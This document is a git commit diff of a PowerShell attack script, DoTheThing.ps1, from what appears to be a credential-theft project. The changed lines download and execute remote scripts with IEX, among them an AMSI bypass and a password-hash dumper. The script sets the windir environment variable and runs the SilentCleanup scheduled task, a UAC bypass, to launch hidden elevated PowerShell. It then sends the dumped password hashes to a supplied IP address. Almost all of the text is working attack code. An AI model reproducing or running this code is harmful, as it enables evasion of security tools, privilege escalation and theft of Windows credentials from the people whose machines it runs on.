1e358081e5839743593fb428a5f0e5fdda0cef21
mo-tec <moritzpfefferkorn@hotmail.com>
2020-10-12 15:38:23 +0200

    Update DoTheThing.ps1

--- DoTheThing.ps1
+++ DoTheThing.ps1
@@ -1,7 +1,8 @@
-.\AMSI-Bypass.ps1
+
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/AMSI-Bypass.ps1')
 $registryPath = "HKCU:\Environment"
 $Name = "windir"
-$Value = "powershell -windowstyle hidden import-module " + "'" + (resolve-path .\AMSI-Bypass.ps1) + "'" + ";import-module " + "'" + (resolve-path .\Get-PassHashes.ps1) + "'" + ";import-module " + "'" + (resolve-path .\Send.ps1) + "'" + ";Get-PassHashes | Out-String | Invoke-Transmission -ip 'localhost';#"
+$Value = "powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/AMSI-Bypass.ps1');IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Get-PassHashes.ps1');IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Invoke-Transmission.ps1');Get-PassHashes | Out-String | Invoke-Transmission -ip " + $ip + ";#"
 Set-ItemProperty -Path $registryPath -Name $name -Value $Value
 schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
 sleep 2
